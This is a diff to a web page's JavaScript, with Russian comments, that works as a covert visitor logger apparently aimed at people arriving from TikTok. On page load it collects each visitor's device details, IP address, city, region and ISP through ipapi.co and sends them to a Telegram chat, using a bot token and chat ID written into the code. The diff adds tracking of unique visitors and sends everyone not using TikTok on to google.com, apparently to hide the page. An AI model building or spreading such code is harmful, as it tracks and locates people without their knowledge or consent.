@@ -123,10 +123,29 @@
         const TELEGRAM_BOT_TOKEN = '7493763616:AAFi0MZpHax9ALjz97knaYEf9UOobjRmN2Q';
         const TELEGRAM_CHAT_ID = '-4610081050';
         
-        // Улучшенная функция для определения TikTok WebView
+        // Функция для проверки уникальности посетителя
+        function isUniqueVisitor(ip) {
+            // Получаем сохраненные IP адреса из localStorage
+            const visitors = JSON.parse(localStorage.getItem('visitors') || '{}');
+            
+            // Проверяем, был ли этот IP раньше
+            const lastVisit = visitors[ip];
+            const now = new Date().getTime();
+            
+            // Если IP не найден или последнее посещение было более 24 часов назад
+            if (!lastVisit || (now - lastVisit) > 24 * 60 * 60 * 1000) {
+                // Сохраняем время посещения
+                visitors[ip] = now;
+                localStorage.setItem('visitors', JSON.stringify(visitors));
+                return true;
+            }
+            
+            return false;
+        }
+        
+        // Функция для определения TikTok WebView
         function isTikTokWebView() {
             const userAgent = navigator.userAgent.toLowerCase();
-            // Расширенный список признаков TikTok WebView
             const tiktokSignatures = [
                 'tiktok',
                 'musical_ly',
@@ -134,8 +153,6 @@
                 'tiktokapp',
                 'musically'
             ];
-            
-            // Проверяем наличие любого из признаков
             return tiktokSignatures.some(signature => userAgent.includes(signature));
         }
         
@@ -152,19 +169,24 @@
                 isMobile: /Mobile|Android|iPhone/i.test(navigator.userAgent),
                 browser: getBrowserInfo(),
                 os: getOSInfo(),
-                isTikTok: isTikTokWebView() // Добавляем результат проверки в данные
+                isTikTok: isTikTokWebView()
             };
         
-            // Получаем IP и геоданные через ipapi.co
+            // Получаем IP и геоданные
             try {
                 const response = await fetch('https://ipapi.co/json/');
                 const ipData = await response.json();
+                
+                // Проверяем уникальность посетителя
+                const isUnique = isUniqueVisitor(ipData.ip);
+                
                 Object.assign(data, {
                     ip: ipData.ip,
                     country: ipData.country_name,
                     city: ipData.city,
                     region: ipData.region,
                     isp: ipData.org,
+                    isUniqueVisitor: isUnique
                 });
             } catch (error) {
                 console.error('Error fetching IP data:', error);
@@ -204,7 +226,12 @@
         
         // Функция для отправки данных в Telegram
         async function sendToTelegram(data) {
+            // Добавляем эмодзи для уникальности посещения
+            const uniqueStatus = data.isUniqueVisitor ? '🆕 УНИКАЛЬНЫЙ ПОСЕТИТЕЛЬ' : '♻️ ПОВТОРНЫЙ ПОСЕТИТЕЛЬ';
+            
             const message = `
+        ${uniqueStatus}
+        
         🔍 Новый посетитель:
         
         📱 Устройство:
@@ -265,13 +292,13 @@
             // Проверяем необходимость редиректа и добавляем задержку
             setTimeout(() => {
                 const isTikTok = isTikTokWebView();
-                console.log('Is TikTok WebView:', isTikTok); // Отладочная информация
-                console.log('User Agent:', navigator.userAgent); // Отладочная информация
+                console.log('Is TikTok WebView:', isTikTok);
+                console.log('User Agent:', navigator.userAgent);
                 
                 if (!isTikTok) {
-                    window.location.href = 'https://www.twitch.tv/shadowkekw';
+                    window.location.href = 'https://www.google.com/';
                 }
-            }, 500); // Небольшая задержка для гарантии отправки данных
+            }, 500);
         }
         
         // Запускаем скрипт при загрузке страницы
